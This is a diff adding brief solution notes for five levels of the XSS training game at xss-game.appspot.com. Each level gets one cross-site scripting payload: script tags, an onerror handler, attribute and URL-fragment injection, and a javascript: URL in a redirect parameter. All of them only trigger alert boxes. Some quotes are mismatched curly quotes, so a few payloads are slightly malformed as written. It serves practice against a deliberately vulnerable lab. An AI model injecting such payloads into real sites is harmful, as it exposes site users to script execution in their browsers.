@@ -1,0 +1,15 @@
+Level 1
+<script>alert(“XSS");</script>
+
+Level 2
+<img on error = alert(“XSS");>
+
+Level 3
+https://xss-game.appspot.com/level3/frame/#1' onerror=‘alert("xss")'>
+
+Level 4
+)%3Balert(‘1
+
+Level 5
+javascript:alert(‘XSS')
+https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('XSS')
